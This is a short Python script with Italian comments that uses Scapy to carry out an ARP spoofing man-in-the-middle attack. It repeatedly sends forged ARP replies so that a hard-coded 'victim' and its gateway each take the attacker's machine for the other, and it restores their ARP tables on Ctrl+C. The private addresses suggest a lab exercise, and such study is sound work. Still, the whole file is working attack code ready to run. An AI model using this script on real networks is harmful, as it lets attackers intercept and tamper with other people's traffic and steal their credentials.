from scapy.all import Ether, ARP, srp, send
import argparse
import time
import os
import sys


# Ritorna il MAC Address di qualsiasi dispositivo connesso alla rete
def get_mac(ip):
    # Manda un pacchetto ARP in broadcast
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


# Fa spoofing indicando a target_ip di essere host_ip
def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)

    # viene costruito un pacchetto ARP 'is-at' (una ARP reply)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)

    if verbose:
        # Prende il MAC address dell'interfaccia di rete che si sta utilizzando
        self_mac = ARP().hwsrc
        print("[+] Mandato a {} : {} is-at {}".format(target_ip, host_ip, self_mac))


# Annulla le modifiche applicate alle ARP tables
def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")

    # la risposta viene mandata tante volte per assicurarsi che tutto vada a buon fine (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Mandato a {} : {} is-at {}".format(target_ip, host_ip, host_mac))


if __name__ == "__main__":
    target = "10.0.2.15"                    # indirizzo IP della vittima    ù
    host = "10.0.2.1"                       # indirizzo IP del gateway
    verbose = True
    try:
        while True:
            spoof(target, host, verbose)    # dico alla vittima che sono il gateway
            spoof(host, target, verbose)    # dico al gateway che sono la vittima
            
            time.sleep(3)
    except KeyboardInterrupt:
        print("[!] CTRL+C ! Annullando le modifiche, aspetta...")
        restore(target, host)
        restore(host, target)
